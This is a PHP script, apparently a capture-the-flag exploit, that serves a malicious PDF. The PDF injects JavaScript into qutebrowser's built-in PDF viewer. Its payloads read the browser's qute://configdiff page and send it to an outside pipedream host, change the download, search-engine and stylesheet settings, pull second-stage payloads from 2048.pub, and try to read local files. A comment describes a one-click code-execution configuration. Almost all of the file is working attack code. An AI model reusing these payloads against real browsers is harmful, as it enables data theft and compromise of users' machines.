<?php

header('Content-Type: application/pdf');
header('Content-Disposition: attachment; filename="x"');

//Cannot use semicolon for the payload, good luck :-(
//One-click RCE: fileselect.handler = external, fileselect.single_file.command = ["calc"]

//test for XSS
$payload = "fetch('https://eomvog4gp4gwtqa.m.pipedream.net/?'+location)";

//Flag 1: get configuration to read homepage
if($_GET[0]==1){
$payload = <<<HEREDOC
(i = document.createElement('iframe')) +
(i.src = 'qute://configdiff') +
(i.onload = _ => {
    fetch('https://eomvog4gp4gwtqa.m.pipedream.net/?'+btoa(i.contentWindow.document.body.innerText))
}) + 
document.body.appendChild(i)
HEREDOC;
}

//Flag 2: read local randomly named file
//step 1: download local payload (you don't need the search engine setting in this version of the server setting)
if($_GET[0]==2){
$payload = <<<HEREDOC
(i = open('qute://settings')) +
(i.onload = _ => {
    (i.cset('downloads.location.directory','/tmp')) +
    (i.cset('downloads.location.prompt','false')) + 
    (i.cset('url.searchengines','{"DEFAULT":"file:///tmp/httpnooneplays.htm?{}"}')) +
    (open('https://2048.pub/__killt/payload2.php')) +
    fetch('https://eomvog4gp4gwtqa.m.pipedream.net/?pwned')
})
HEREDOC;
}
//step 2: get filename
//httpnooneplays.htm
//no this does not work... lol, then how to open local file?
//...
//...
// http://../../tmp/httpnooneplays.htm
// wtf?
if($_GET[0]==22222){
$payload = <<<HEREDOC
(i = open('qute://settings')) +
(i.onload = _ => {
    (i.open('javascript:location="file:///tmp/httpnooneplays.htm"')) +
    fetch('https://eomvog4gp4gwtqa.m.pipedream.net/?pwnedaba')
})
HEREDOC;
}

//step 3: get content
if($_GET[0]==3){
$payload = <<<HEREDOC
(i = open('qute://settings')) +
(i.onload = _ => {
    (i.cset('content.user_stylesheets','/proof_d2e4f0a6-55e8-4897-9ce0-e829cdc8279e.sh')) +
    (open('https://2048.pub/__killt/payload3.htm')) +
    fetch('https://eomvog4gp4gwtqa.m.pipedream.net/?pwned3')
})
HEREDOC;
}
echo "/%PDF-1.4\n1 0 obj\n<<\n  /FunctionType 4\n  /Domain [(" . $payload . ") 0]\n  /Range [0 0]\n  /Length 12\n>>\nstream\n{\n  0 add\n}\nendstream\nendobj\n2 0 obj\n<<\n  /Type /Catalog\n  /Pages 3 0 R\n>>\nendobj\n3 0 obj\n<<\n  /Type /Pages\n  /Kids [6 0 R]\n  /Count 1\n>>\nendobj\n4 0 obj\n[ /Indexed\n  [ /DeviceN\n    [/Cyan /Black]\n    /DeviceCMYK\n    1 0 R\n  ]\n  1(123)\n]\nendobj\n5 0 obj\n<<\n  /Type /XObject\n  /Subtype /Image\n  /Width 1\n  /Height 1\n  /ColorSpace 4 0 R\n  /BitsPerComponent 8\n  /Length 1\n>>\nstream\nx\nendstream\nendobj\n6 0 obj\n<<\n  /Type /Page\n  /Parent 3 0 R\n  /Resources\n  <<\n    /XObject << /Im5 5 0 R >>\n  >>\n  /MediaBox [0 0 100 100]\n  /Contents 7 0 R\n>>\nendobj\n7 0 obj\n<<\n  /Length 100\n>>\nstream\n  1  1  1  rg\n  0  0  100 100 re  f\n  BT\n    /Para << /MCID 1 >>\n    BDC\n      /Im5 Do\n    EMC\n  ET\nendstream\nendobj\ntrailer\n<<\n  /Root 2 0 R\n>>\nstartxref\n%%EOF\n";
?>